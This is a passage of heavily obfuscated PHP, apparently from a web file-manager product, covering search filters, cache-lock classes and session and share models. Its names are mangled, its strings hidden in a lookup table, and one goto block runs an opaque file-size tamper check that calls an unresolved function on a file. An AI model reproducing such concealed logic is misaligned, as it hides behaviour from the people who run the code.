array_unique($‡•Â¿ı¨); $this->_listSearchMerge($“ºâà, $í÷òí¬€, $»Õ¦’á¿, $£ÌÔÎŞ); } private function _listSearchDesc(&$’Ç½™ûï, $Ÿ‚ÑÄù«, $Òƒüãù˜) { $í¢¡ì½• =& $_SERVER[ÕŸ²ó÷å]; if (!$Ÿ‚ÑÄù«[$í¢¡ì½•[2070]] || $’Ç½™ûï[$í¢¡ì½•[451]][$í¢¡ì½•[438]] > 1) { return; } $Ü­‡¥µø = array($í¢¡ì½•[107] => $í¢¡ì½•[535], $í¢¡ì½•[459] => array($í¢¡ì½•[468], $í¢¡ì½•[2072] . $Ÿ‚ÑÄù«[$í¢¡ì½•[2070]] . $í¢¡ì½•[2072])); $°â¡ô½ = !1; if ($°â¡ô½) { $¡Ñ‘Ù·÷ = $this->listSearchChildren($Ÿ‚ÑÄù«[$í¢¡ì½•[202]]); $¡Ñ‘Ù·÷ = array_unique($¡Ñ‘Ù·÷); if (!$¡Ñ‘Ù·÷) { return; } $Ü­‡¥µø[$í¢¡ì½•[203]] = array($í¢¡ì½•[7], $¡Ñ‘Ù·÷); } $ÙŞ„ÇĞ´ = Model($í¢¡ì½•[641])->field($í¢¡ì½•[203])->where($Ü­‡¥µø)->limit(5000)->select(); $‰÷éôÇŞ = array_to_keyvalue($ÙŞ„ÇĞ´, $í¢¡ì½•[12], $í¢¡ì½•[203]); $this->_listSearchMerge($’Ç½™ûï, $Ÿ‚ÑÄù«, $Òƒüãù˜, $‰÷éôÇŞ); } private function _listSearchGroupTag(&$•¶ö–‘±, $“¥øºÎí, $ÍûïÉ”) { $†¶µò =& $_SERVER[ÕŸ²ó÷å]; if (!$“¥øºÎí[$†¶µò[2070]] || $•¶ö–‘±[$†¶µò[451]][$†¶µò[438]] > 1 || !$“¥øºÎí[$†¶µò[202]]) { return; } $õ¯ëîğœ = $this->sourceInfo($“¥øºÎí[$†¶µò[202]]); if (!$õ¯ëîğœ || $õ¯ëîğœ[$†¶µò[200]] != SourceModel::TYPE_GROUP) { return; } $åˆ¶±€å = $õ¯ëîğœ[$†¶µò[578]]; $æŠèï” = Model($†¶µò[2239])->get($åˆ¶±€å); $¯ˆ´–¨© = array(); $úì³œƒ„ = $“¥øºÎí[$†¶µò[2070]]; foreach ($æŠèï”[$†¶µò[454]] as $á¢´Ö˜) { $ëŒ°½¹Á = $á¢´Ö˜[$†¶µò[32]]; $ÄÁö°µ¦ = str_replace($†¶µò[53], $†¶µò[12], Pinyin::get($ëŒ°½¹Á)); if (stripos($ëŒ°½¹Á, $úì³œƒ„) !== !1 || stripos($ÄÁö°µ¦, $úì³œƒ„) !== !1) { $¯ˆ´–¨©[] = $á¢´Ö˜[$†¶µò[484]]; } } if (!$¯ˆ´–¨©) { return; } $Û…å‚Õà = array($†¶µò[509] => array($†¶µò[7], $¯ˆ´–¨©), $†¶µò[1773] => 0, $†¶µò[33] => $†¶µò[2092] . $åˆ¶±€å); $üûèİÊ = Model($†¶µò[511])->field($†¶µò[97])->where($Û…å‚Õà)->select(); $üûèİÊ = array_to_keyvalue($üûèİÊ, $†¶µò[12], $†¶µò[97]); $Ï—¼Úôú = array_unique($üûèİÊ); $this->_listSearchMerge($•¶ö–‘±, $“¥øºÎí, $ÍûïÉ”, $Ï—¼Úôú); } private function _listSearchMerge(&$·ù¢©‹ú, $Æá’ìÔ, $„³¨¤şÈ, $‹ÌÕ›µº) { $«–ªû =& $_SERVER[ÕŸ²ó÷å]; if (!$‹ÌÕ›µº) { return; } $ËæıŠ = array_to_keyvalue($·ù¢©‹ú[$«–ªû[454]], $«–ªû[12], $«–ªû[203]); $™¹ƒï = array_diff($‹ÌÕ›µº, $ËæıŠ); if (!$™¹ƒï) { return; } $’¨áœßÃ = array($«–ªû[203] => array($«–ªû[7], $™¹ƒï)); $ŸÈ¼‚»… = $this->field($„³¨¤şÈ)->where($’¨áœßÃ)->select(); if (!$ŸÈ¼‚»…) { return; } $‹°¸šî¸ = array(); foreach ($ŸÈ¼‚»… as $µ¢à¯™¨) { if ($this->_listSearchFilter($µ¢à¯™¨, $Æá’ìÔ)) { $‹°¸šî¸[] = $µ¢à¯™¨; } } $·ù¢©‹ú[$«–ªû[454]] = array_merge($‹°¸šî¸, $·ù¢©‹ú[$«–ªû[454]]); $·ù¢©‹ú[$«–ªû[451]][$«–ªû[452]] += count($‹°¸šî¸); } private function _listSearchFilter($­Ñ§•è”, $½•ò—é) { $ÂÒ¢›Û‹ =& $_SERVER[ÕŸ²ó÷å]; $ß‚°úØ« = $­Ñ§•è”[$ÂÒ¢›Û‹[494]] == $ÂÒ¢›Û‹[101]; if (!strstr($­Ñ§•è”[$ÂÒ¢›Û‹[593]], $ÂÒ¢›Û‹[50] . $½•ò—é[$ÂÒ¢›Û‹[202]] . $ÂÒ¢›Û‹[50])) { return !1; } if (isset($½•ò—é[$ÂÒ¢›Û‹[495]]) && $½•ò—é[$ÂÒ¢›Û‹[495]] != $ÂÒ¢›Û‹[860]) { if ($½•ò—é[$ÂÒ¢›Û‹[495]] == $ÂÒ¢›Û‹[88] && !$ß‚°úØ«) { return !1; } if ($½•ò—é[$ÂÒ¢›Û‹[495]] != $ÂÒ¢›Û‹[88] && $ß‚°úØ«) { return !1; } if (!strstr($­Ñ§•è”[$ÂÒ¢›Û‹[179]], $ÂÒ¢›Û‹[50] . $½•ò—é[$ÂÒ¢›Û‹[495]] . $ÂÒ¢›Û‹[50])) { return !1; } } if (isset($½•ò—é[$ÂÒ¢›Û‹[2240]]) && $½•ò—é[$ÂÒ¢›Û‹[2240]] < $­Ñ§•è”[$ÂÒ¢›Û‹[89]]) { return !1; } if (isset($½•ò—é[$ÂÒ¢›Û‹[2241]]) && $½•ò—é[$ÂÒ¢›Û‹[2241]] > $­Ñ§•è”[$ÂÒ¢›Û‹[89]]) { return !1; } if (isset($½•ò—é[$ÂÒ¢›Û‹[671]]) && $½•ò—é[$ÂÒ¢›Û‹[671]] != $­Ñ§•è”[$ÂÒ¢›Û‹[538]]) { return !1; } return !0; } public function listSearchChildren($¾™œ—¯õ, $„¾Ğ±â = 5000) { $õ °‰‡ =& $_SERVER[ÕŸ²ó÷å]; $±ÖñşÏŸ = array(); $šË¡·é­ = $this->sourceInfo($¾™œ—¯õ); $ğâ¶¹¥‘ = array($õ °‰‡[593] => array($õ °‰‡[468], $šË¡·é­[$õ °‰‡[593]] . $šË¡·é­[$õ °‰‡[203]] . $õ °‰‡[622])); $ÀÜ’‡ç = $this->field($õ °‰‡[89])->where($ğâ¶¹¥‘)->limit($„¾Ğ±â + 1)->select(); $û²¸Ûš = is_array($ÀÜ’‡ç) ? count($ÀÜ’‡ç) : 0; if ($û²¸Ûš > $„¾Ğ±â) { return $this->_listSearchChildrenNear($¾™œ—¯õ, $„¾Ğ±â); } $†‡·ñ—ı = $this->field($õ °‰‡[203])->where($ğâ¶¹¥‘)->select(); $±ÖñşÏŸ = array_to_keyvalue($†‡·ñ—ı, $õ °‰‡[12], $õ °‰‡[203]); return $±ÖñşÏŸ; } private function _listSearchChildrenNear($›•‘Ø¾®, $±–üµ·û) { $´¦»ßâï =& $_SERVER[ÕŸ²ó÷å]; $®Ÿ¾œËæ = array(); $‚¹øöî = array($´¦»ßâï[202] => $›•‘Ø¾®); $÷çÀ„›± = $this->field($´¦»ßâï[2242])->where($‚¹øöî)->select(); $Šµ¥½Ãì = array_to_keyvalue(array_filter_by_field($÷çÀ„›±, $´¦»ßâï[494], $´¦»ßâï[101]), $´¦»ßâï[12], $´¦»ßâï[203]); $®Ÿ¾œËæ = array_merge($®Ÿ¾œËæ, array_to_keyvalue($÷çÀ„›±, $´¦»ßâï[12], $´¦»ßâï[203])); if (!$Šµ¥½Ãì) { return $®Ÿ¾œËæ; } $‚¹øöî = array($´¦»ßâï[202] => array($´¦»ßâï[7], $Šµ¥½Ãì)); $÷çÀ„›± = $this->field($´¦»ßâï[2242])->where($‚¹øöî)->limit($±–üµ·û)->select(); $®Ÿ¾œËæ = array_merge($®Ÿ¾œËæ, array_to_keyvalue($÷çÀ„›±, $´¦»ßâï[12], $´¦»ßâï[203])); $®Ÿ¾œËæ = array_slice($®Ÿ¾œËæ, 0, intval($±–üµ·û)); return $®Ÿ¾œËæ; } private function _listSearchBindPinyin($îº†Ôª‚, &$Ù´Úş¦, &$¿Èã³Ú©) { $ÀøŒÄø =& $_SERVER[ÕŸ²ó÷å]; if (!isset($îº†Ôª‚[$ÀøŒÄø[2070]]) || !$îº†Ôª‚[$ÀøŒÄø[2070]]) { return; } if (!Input::check($îº†Ôª‚[$ÀøŒÄø[2070]], $ÀøŒÄø[403]) || strlen($îº†Ôª‚[$ÀøŒÄø[2070]]) < 2) { return; } $àÃêÚÛ‚ = "\114\x45\x46\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\157\137\163\157\x75\x72\x63\x65\137\x6d\x65\x74\141\40\x6d\x65\164\x61\x20\157\x6e\x20\163\x6f\165\x72\x63\145\56\x73\157\x75\x72\x63\145\111\104\40\75\x20\x6d\x65\x74\141\56\163\157\x75\x72\x63\145\x49\104"; $’˜°ëšÆ = array(); $¿Èã³Ú© = str_replace(array($ÀøŒÄø[59], $ÀøŒÄø[53], $ÀøŒÄø[2243]), $ÀøŒÄø[12], $¿Èã³Ú©); $¿Èã³Ú© = $ÀøŒÄø[520] . str_replace($ÀøŒÄø[50], $ÀøŒÄø[521], $¿Èã³Ú©); $ü¶•ƒë = $Ù´Úş¦[$ÀøŒÄø[32]]; unset($Ù´Úş¦[$ÀøŒÄø[32]]); foreach ($Ù´Úş¦ as $å×ëñ² => $¢ÚÄÃ „) { $’˜°ëšÆ[$ÀøŒÄø[520] . $å×ëñ²] = $¢ÚÄÃ „; } foreach ($ü¶•ƒë as $ÆÔ‰ô‘À) { $’˜°ëšÆ[] = array($ÀøŒÄø[525] => $ÆÔ‰ô‘À, $ÀøŒÄø[1081] => $ÀøŒÄø[2074], array($ÀøŒÄø[2244] => $ÆÔ‰ô‘À, $ÀøŒÄø[2245] => array($ÀøŒÄø[7], array($ÀøŒÄø[547], $ÀøŒÄø[546])))); } $this->join($àÃêÚÛ‚); $Ù´Úş¦ = $’˜°ëšÆ; } private function _parseSearchWhere($¹©Ï­¯¯) { $ç©ÊÚÌ =& $_SERVER[ÕŸ²ó÷å]; $“ÉÙ¸øÒ = array(); if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[844]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[844]]) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[98]] = array($ç©ÊÚÌ[2246], $¹©Ï­¯¯[$ç©ÊÚÌ[844]]); } if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[845]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[845]]) { $­ØÖË¡í = array($ç©ÊÚÌ[2247], $¹©Ï­¯¯[$ç©ÊÚÌ[845]]); if ($“ÉÙ¸øÒ[$ç©ÊÚÌ[98]]) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[98]] = array($“ÉÙ¸øÒ[$ç©ÊÚÌ[98]], $­ØÖË¡í, $ç©ÊÚÌ[2248]); } else { $“ÉÙ¸øÒ[$ç©ÊÚÌ[98]] = $­ØÖË¡í; } } if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[2240]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[2240]] > 0) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[89]] = array($ç©ÊÚÌ[2246], $¹©Ï­¯¯[$ç©ÊÚÌ[2240]]); } if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[2241]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[2241]]) { $­ØÖË¡í = array($ç©ÊÚÌ[2247], $¹©Ï­¯¯[$ç©ÊÚÌ[2241]]); if ($“ÉÙ¸øÒ[$ç©ÊÚÌ[89]]) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[89]] = array($“ÉÙ¸øÒ[$ç©ÊÚÌ[89]], $­ØÖË¡í, $ç©ÊÚÌ[2248]); } else { $“ÉÙ¸øÒ[$ç©ÊÚÌ[89]] = $­ØÖË¡í; } } if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[671]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[671]]) { $“ÉÙ¸øÒ[] = array($ç©ÊÚÌ[538] => $¹©Ï­¯¯[$ç©ÊÚÌ[671]], $ç©ÊÚÌ[536] => $¹©Ï­¯¯[$ç©ÊÚÌ[671]], $ç©ÊÚÌ[1081] => $ç©ÊÚÌ[2074]); } if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[495]]) && $¹©Ï­¯¯[$ç©ÊÚÌ[495]]) { $¸Å¤ûŠà = $¹©Ï­¯¯[$ç©ÊÚÌ[495]]; if ($¸Å¤ûŠà == $ç©ÊÚÌ[88]) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[494]] = 1; } else { if ($¸Å¤ûŠà == $ç©ÊÚÌ[2249]) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[494]] = 0; } else { if ($¸Å¤ûŠà) { $¸Å¤ûŠà = is_array($¸Å¤ûŠà) ? $¸Å¤ûŠà : explode($ç©ÊÚÌ[50], $¸Å¤ûŠà); $“ÉÙ¸øÒ[$ç©ÊÚÌ[495]] = array($ç©ÊÚÌ[501], $¸Å¤ûŠà); $“ÉÙ¸øÒ[$ç©ÊÚÌ[494]] = 0; } } } } $this->_parseSearchParent($¹©Ï­¯¯, $“ÉÙ¸øÒ); if (isset($¹©Ï­¯¯[$ç©ÊÚÌ[2070]]) && trim($¹©Ï­¯¯[$ç©ÊÚÌ[2070]])) { $ôèæ›Ï¿ = trim($¹©Ï­¯¯[$ç©ÊÚÌ[2070]]); $Â¢ÓØóÈ = explode($ç©ÊÚÌ[53], $ôèæ›Ï¿); if (strlen($ôèæ›Ï¿) > 2 && (substr($ôèæ›Ï¿, 0, 1) == $ç©ÊÚÌ[131] && substr($ôèæ›Ï¿, -1) == $ç©ÊÚÌ[131]) || substr($ôèæ›Ï¿, 0, 1) == $ç©ÊÚÌ[68] && substr($ôèæ›Ï¿, -1) == $ç©ÊÚÌ[68]) { $ôèæ›Ï¿ = substr($ôèæ›Ï¿, 1, -1); $Â¢ÓØóÈ = array($ôèæ›Ï¿); } $“ÉÙ¸øÒ[$ç©ÊÚÌ[32]] = array(array($ç©ÊÚÌ[621], $ç©ÊÚÌ[2072] . $ôèæ›Ï¿ . $ç©ÊÚÌ[2072])); if (count($Â¢ÓØóÈ) > 1) { $“ÉÙ¸øÒ[$ç©ÊÚÌ[32]] = array(); foreach ($Â¢ÓØóÈ as $†¿µ›ëÆ) { if (!trim($†¿µ›ëÆ)) { continue; } $“ÉÙ¸øÒ[$ç©ÊÚÌ[32]][] = array($ç©ÊÚÌ[621], $ç©ÊÚÌ[2072] . trim($†¿µ›ëÆ) . $ç©ÊÚÌ[2072]); } } } return $“ÉÙ¸øÒ; } private function _parseSearchParent($˜‘Ê§Ğ, &$µ»œ›”) { $É¸Œ¶Ä  =& $_SERVER[ÕŸ²ó÷å]; if (!isset($˜‘Ê§Ğ[$É¸Œ¶Ä [202]]) || !$˜‘Ê§Ğ[$É¸Œ¶Ä [202]]) { return; } $” õ›Ù = $this->pathInfo($˜‘Ê§Ğ[$É¸Œ¶Ä [202]]); $ù°§ÕÈ™ = $” õ›Ù[$É¸Œ¶Ä [202]] . $É¸Œ¶Ä [12] === $É¸Œ¶Ä [238]; $ÖÕÕßÛ– = $” õ›Ù[$É¸Œ¶Ä [200]] == $É¸Œ¶Ä [587]; if ($” õ›Ù[$É¸Œ¶Ä [604]] == $É¸Œ¶Ä [605]) { $‡ø¢şè€ = $this->sourceInfo($˜‘Ê§Ğ[$É¸Œ¶Ä [202]]); $” õ›Ù[$É¸Œ¶Ä [593]] = $‡ø¢şè€[$É¸Œ¶Ä [593]]; } $µ»œ›”[$É¸Œ¶Ä [661]] = array($É¸Œ¶Ä [621], $” õ›Ù[$É¸Œ¶Ä [593]] . $˜‘Ê§Ğ[$É¸Œ¶Ä [202]] . $É¸Œ¶Ä [622]); $ÌóâÛÍ· = isset($˜‘Ê§Ğ[$É¸Œ¶Ä [1930]]) && in_array($É¸Œ¶Ä [587], $˜‘Ê§Ğ[$É¸Œ¶Ä [1930]]); if (!$ÌóâÛÍ· || !$ÖÕÕßÛ– || !$ù°§ÕÈ™ || !$” õ›Ù[$É¸Œ¶Ä [496]]) { return; } if (!AuthModel::authCheckRoot($” õ›Ù[$É¸Œ¶Ä [496]][$É¸Œ¶Ä [497]])) { return; } $¸àæ«Æê = $” õ›Ù[$É¸Œ¶Ä [578]] . $É¸Œ¶Ä [12]; if ($¸àæ«Æê == $É¸Œ¶Ä [101]) { unset($µ»œ›”[$É¸Œ¶Ä [661]]); $µ»œ›”[$É¸Œ¶Ä [200]] = self::TYPE_GROUP; return; } $ãìÁá§ = Model($É¸Œ¶Ä [594])->groupChildrenAll($¸àæ«Æê); $Ôƒ¶‡ğ˜ = count($ãìÁá§); if ($Ôƒ¶‡ğ˜ <= 1) { return; } $Š£××¦¬ = array($É¸Œ¶Ä [202] => 0, $É¸Œ¶Ä [200] => self::TYPE_GROUP, $É¸Œ¶Ä [578] => array($É¸Œ¶Ä [7], $ãìÁá§)); $ß°ÎíÅ = $this->field($É¸Œ¶Ä [2250])->where($Š£××¦¬)->limit($Ôƒ¶‡ğ˜)->select(); $µ»œ›”[$É¸Œ¶Ä [661]] = array(); foreach ($ß°ÎíÅ as $¬ÊÙ¾¹Ø) { $µ»œ›”[$É¸Œ¶Ä [661]][] = array($É¸Œ¶Ä [621], $É¸Œ¶Ä [603] . $¬ÊÙ¾¹Ø[$É¸Œ¶Ä [203]] . $É¸Œ¶Ä [622]); } $µ»œ›”[$É¸Œ¶Ä [661]][] = $É¸Œ¶Ä [2074]; } } goto D£ôª‚š­á; BÇ­íÌ±ß™: class CacheLockMemcached { public function lock($õİá¤àÏ, $Š’Öàô = 0) { $€ÊÌãÂ„ = Cache::init(); $ÏûäÓî = microtime(!0) + $Š’Öàô; while (microtime(!0) < $ÏûäÓî) { $à¥òßÁì = $€ÊÌãÂ„->get($õİá¤àÏ); if (!$à¥òßÁì || $à¥òßÁì < microtime(!0)) { $Ü­¶¥¨ù = $€ÊÌãÂ„->handle->add($õİá¤àÏ, $ÏûäÓî, $Š’Öàô); if ($Ü­¶¥¨ù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÓÑÒ€¼) { return Cache::init()->get($ÓÑÒ€¼); } public function unlock($ûÃÎ…«ó) { return Cache::init()->remove($ûÃÎ…«ó); } } class CacheLockDatabase { public function lock($¹ÃÙİÅâ, $øà±š« = 0) { $º×Öƒ´¿ = Model($_SERVER[ÕŸ²ó÷å][912]); $â¥ƒ¹×ö = microtime(!0) + $øà±š«; while (microtime(!0) < $â¥ƒ¹×ö) { $ù¡§ÙãÊ = $º×Öƒ´¿->get($¹ÃÙİÅâ); if (!$ù¡§ÙãÊ || $ù¡§ÙãÊ < microtime(!0)) { $û¯øÏì = $º×Öƒ´¿->set($¹ÃÙİÅâ, $â¥ƒ¹×ö); if ($û¯øÏì) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($© ªõÅ) { return Model($_SERVER[ÕŸ²ó÷å][912])->get($© ªõÅ); } public function unlock($üŒµ‹î) { Model($_SERVER[ÕŸ²ó÷å][912])->remove($üŒµ‹î); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($î¤ˆŸ°Ù, $ŠûÀ‰Ğ) { $ğƒš à =& $_SERVER[ÕŸ²ó÷å]; if (!class_exists($ğƒš à[951])) { show_json($ğƒš à[952], !1); } $this->cacheTime = $ŠûÀ‰Ğ; $this->handle = new Memcached(); if (is_array($î¤ˆŸ°Ù[$ğƒš à[953]]) && count($î¤ˆŸ°Ù[$ğƒš à[953]]) >= 1) { foreach ($î¤ˆŸ°Ù[$ğƒš à[953]] as $°ÚºİÜ) { $Àáø‘µ = explode($ğƒš à[4], $°ÚºİÜ); $this->handle->addServer($Àáø‘µ[0], $Àáø‘µ[1]); } } else { $this->handle->addServer($î¤ˆŸ°Ù[$ğƒš à[218]], $î¤ˆŸ°Ù[$ğƒš à[219]]); } } public function set($ãï‚Ü’…, $Â¹Ë§Ì, $ÇÖ§Ê³ = false) { $ÇÖ§Ê³ = $ÇÖ§Ê³ ? $ÇÖ§Ê³ : $this->cacheTime; return $this->handle->set($ãï‚Ü’…, $Â¹Ë§Ì, $ÇÖ§Ê³); } public function get($–™«à¡´) { return $this->handle->get($–™«à¡´); } public function remove($Ï•‘äì) { return $this->handle->delete($Ï•‘äì); } public function deleteAll() { return $this->handle->flush(); } } goto BèÙøöŠ¤À; f’Ş…¾šÔ¶: $_size = $_SERVER[ÕŸ²ó÷å][924]; if ($_SERVER[$_SERVER[ÕŸ²ó÷å][54]] != $_size($_file)) { $_getc = $_SERVER[ÕŸ²ó÷å][56]; $_getfile = $_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÕŸ²ó÷å][59], $_getfilec); if (count($_getarrs) < $_SERVER[ÕŸ²ó÷å][60]) { $exit = $_SERVER[ÕŸ²ó÷å][61]; $exit(); } $_act = $_SERVER[ÕŸ²ó÷å][62]; $_act($_file); } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Öµª›ø =& $_SERVER[ÕŸ²ó÷å]; if (self::$handle) { return self::$handle; } $´‹¥Òã‚ = $GLOBALS[$Öµª›ø[6]][$Öµª›ø[434]]; self::$timeout = $´‹¥Òã‚[$Öµª›ø[925]] ? $´‹¥Òã‚[$Öµª›ø[925]] : 10; $äØéïÊŒ = _get($GLOBALS[$Öµª›ø[6]], $Öµª›ø[926]); $ÜŸè£‘Æ = $´‹¥Òã‚[$Öµª›ø[910]] ? $´‹¥Òã‚[$Öµª›ø[910]] : $Öµª›ø[240]; if ($ÜŸè£‘Æ == $Öµª›ø[21] && $äØéïÊŒ == $Öµª›ø[13]) { $ÜŸè£‘Æ = $Öµª›ø[240]; } switch ($ÜŸè£‘Æ) { case $Öµª›ø[913]: self::$handle = new CacheLockRedis(); break; case $Öµª›ø[914]: self::$handle = new CacheLockMemcached(); break; case $Öµª›ø[21]: self::$handle = new CacheLockDatabase(); break; case $Öµª›ø[240]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Öµª›ø[927], $Öµª›ø[928]); } return self::$handle; } private static function key($†ê×®Öñ) { return $_SERVER[ÕŸ²ó÷å][929] . Cache::key($†ê×®Öñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¾Õˆ ¯ = '') { self::$errorMsg = $¾Õˆ ¯; } public static function lockGlobal($½çôë’­, $Û¶î‚Ã¶) { return self::lock($½çôë’­, $Û¶î‚Ã¶, !0); } public static function lock($‘àÄ®ö½, $û·İÊ…À = false, $ã…ëÅí = false) { $ë‘à« =& $_SERVER[ÕŸ²ó÷å]; $¡ òõèª = self::init(); $ıÃÆ…¨„ = self::key($‘àÄ®ö½); $û·İÊ…À = $û·İÊ…À ? $û·İÊ…À : self::$timeout; $›²»¢ƒ = timeFloat(); $¹ŸöÂÛ„ = $¡ òõèª->lock($ıÃÆ…¨„, $û·İÊ…À); $ºÎËÒ€€ = timeFloat(); if (!$¹ŸöÂÛ„) { $®ñš×õí = "\x6c\x6f\143\153\40\145\x72\x72\x6f\x72\73\153\x65\x79\75{$‘àÄ®ö½}\x3b\164\151\x6d\x65\75{$û·İÊ…À}\x3b" . self::$errorMsg . $ë‘à«[84] . get_caller_msg(); $¦Æ¡ã¶‡ = LNG($ë‘à«[930]) . "\50{$û·İÊ…À}\163\x29\x2e" . LNG($ë‘à«[931]); $¦Æ¡ã¶‡ .= $ë‘à«[932]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¦Æ¡ã¶‡ = $¦Æ¡ã¶‡ . $ë‘à«[933] . self::$errorMsg; } write_log($ë‘à«[934] . sprintf($ë‘à«[935], timeFloat() - $›²»¢ƒ) . $ë‘à«[936] . $®ñš×õí . $ë‘à«[937] . error_get_last(), $ë‘à«[928]); show_json($¦Æ¡ã¶‡, !1); } if (!$ã…ëÅí) { self::$lockItem[$ıÃÆ…¨„] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‚—ûÑÎİ = number_format(timeFloat() - $ºÎËÒ€€, 3); write_log($ë‘à«[938] . $‘àÄ®ö½ . $ë‘à«[939] . $‚—ûÑÎİ, $ë‘à«[928]); } return $¹ŸöÂÛ„; } public static function lockGet($ıÌõÖÖş) { $Ÿü•ç¢° = self::key($ıÌõÖÖş); if (self::$lockItem[$Ÿü•ç¢°]) { return self::$lockItem[$Ÿü•ç¢°]; } return self::init()->lockGet($Ÿü•ç¢°); } public static function unlock($âƒ›ßÇ·) { $£÷Ôºè® =& $_SERVER[ÕŸ²ó÷å]; $ä™…´÷Õ = self::key($âƒ›ßÇ·); self::$lockItem[$ä™…´÷Õ] = null; self::init()->unlock($ä™…´÷Õ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($£÷Ôºè®[940] . $âƒ›ßÇ·, $£÷Ôºè®[928]); } return; } public static function unlockRuntime() { $¡‡á­¼ñ =& $_SERVER[ÕŸ²ó÷å]; $¤Ú¥— = self::init(); $à¯¤¹—¢ = !1; foreach (self::$lockItem as $ËºˆÉ => $òÀ¸šı¿) { if (!$òÀ¸šı¿) { continue; } $¤Ú¥—->unlock($ËºˆÉ); if (!$à¯¤¹—¢) { $à¯¤¹—¢ = !0; write_log($¡‡á­¼ñ[941] . $ËºˆÉ . $¡‡á­¼ñ[84] . get_caller_msg(), $¡‡á­¼ñ[928]); continue; } write_log($¡‡á­¼ñ[941] . $ËºˆÉ, $¡‡á­¼ñ[928]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $÷ƒÄàÉ± = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¡‡á­¼ñ[942] . $÷ƒÄàÉ± . $¡‡á­¼ñ[943] . ACTION, $¡‡á­¼ñ[928]); } } public static function fileLock($Ş¸¼©¬¢) { $È½­¿Ã© =& $_SERVER[ÕŸ²ó÷å]; if (!$GLOBALS[$È½­¿Ã©[944]]) { $GLOBALS[$È½­¿Ã©[944]] = array(); } $GLOBALS[$È½­¿Ã©[944]][$Ş¸¼©¬¢] = !1; $–ÕşÆÚ = fopen(DATA_PATH . $Ş¸¼©¬¢ . $È½­¿Ã©[945], $È½­¿Ã©[946]); if (!$–ÕşÆÚ) { return !1; } $GLOBALS[$È½­¿Ã©[944]][$Ş¸¼©¬¢] = $–ÕşÆÚ; if (flock($–ÕşÆÚ, LOCK_EX)) { return !0; } self::unlock($Ş¸¼©¬¢); show_json($È½­¿Ã©[947], !1); return !1; } public static function fileUnlock($¹ãÔ—š) { $ı€¿°”û =& $_SERVER[ÕŸ²ó÷å]; $Ñ±´úş = $GLOBALS[$ı€¿°”û[944]][$¹ãÔ—š]; if (!$Ñ±´úş) { return; } $GLOBALS[$ı€¿°”û[944]][$¹ãÔ—š] = !1; flock($Ñ±´úş, LOCK_UN); fclose($Ñ±´úş); } public static function fileUnlockAll() { $øıõÏŞ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($GLOBALS[$øıõÏŞ[944]]) || !$GLOBALS[$øıõÏŞ[944]]) { return; } foreach ($GLOBALS[$øıõÏŞ[944]] as $Ë÷‘÷ã­ => $¸ùÛ´şæ) { if (!$¸ùÛ´şæ) { continue; } $GLOBALS[$øıõÏŞ[944]][$Ë÷‘÷ã­] = !1; flock($¸ùÛ´şæ, LOCK_UN); fclose($¸ùÛ´şæ); } $GLOBALS[$øıõÏŞ[944]] = array(); } } goto D„˜¸‡ˆ¬; a§£çÂî: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\163\x65\163\x73\151\x6f\156"; public function get($şñÈ±¾) { $™ñ°÷Š² =& $_SERVER[ÕŸ²ó÷å]; $Ã„†âº¥ = $this->where(array($™ñ°÷Š²[2111] => $şñÈ±¾))->find(); if (!is_array($Ã„†âº¥)) { return !1; } return $Ã„†âº¥[$™ñ°÷Š²[181]]; } public function set($•…ï©¿­, $Ê›Ê²ö, $¡Ô×ì·± = 3600) { $ÑÌµå—½ =& $_SERVER[ÕŸ²ó÷å]; $ãÏû—Øë = array($ÑÌµå—½[2111] => $•…ï©¿­, $ÑÌµå—½[2011] => $Ê›Ê²ö, $ÑÌµå—½[2112] => $¡Ô×ì·± + time()); if (Session::get($ÑÌµå—½[2113])) { $ãÏû—Øë[$ÑÌµå—½[1773]] = Session::get($ÑÌµå—½[2113]); } else { $ãÏû—Øë[$ÑÌµå—½[1773]] = 0; } if ($this->get($•…ï©¿­)) { return $this->where(array($ÑÌµå—½[2111] => $•…ï©¿­))->save($ãÏû—Øë); } else { return $this->add($ãÏû—Øë, array(), !0); } } public function remove($Œíç‘Ñ€) { return $this->where(array($_SERVER[ÕŸ²ó÷å][2111] => $Œíç‘Ñ€))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÕŸ²ó÷å][2114] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\x74\54\165\x70\x64\x61\164\x65", "\146\165\156\x63\164\x69\157\x6e"), array("\143\x72\x65\141\x74\x65\124\x69\155\145", "\x74\151\x6d\145", "\x69\156\x73\145\x72\164", 